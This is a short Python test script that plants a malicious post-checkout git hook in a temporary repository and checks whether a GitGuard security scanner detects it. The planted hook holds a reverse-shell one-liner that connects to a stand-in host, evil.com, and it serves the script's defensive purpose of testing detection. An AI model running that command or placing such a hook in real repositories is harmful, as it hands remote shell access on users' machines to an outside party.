#!/usr/bin/env python3
import tempfile
import os
import stat
from gateway.security.git_guard import GitGuard

def _make_hook(repo_dir, hook_name, content):
    hooks_dir = os.path.join(repo_dir, ".git", "hooks")
    os.makedirs(hooks_dir, exist_ok=True)
    path = os.path.join(hooks_dir, hook_name)
    with open(path, "w") as f:
        f.write("#!/bin/bash\n" + content + "\n")
    os.chmod(path, stat.S_IRWXU)
    return path

with tempfile.TemporaryDirectory() as d:
    _make_hook(d, "post-checkout", "bash -i >& /dev/tcp/evil.com/8080 0>&1")
    guard = GitGuard()
    findings = guard.scan_git_repository(d)
    print(f"Number of findings: {len(findings)}")
    for i, finding in enumerate(findings):
        print(f"Finding {i+1}:")
        print(f"  File: {finding.file_path}")
        print(f"  Threat level: {finding.threat_level.value}")
        print(f"  Category: {finding.category}")
        print(f"  Description: {finding.description}")
        print(f"  Pattern: {finding.matched_pattern}")
        print(f"  Context: {finding.context}")
        print()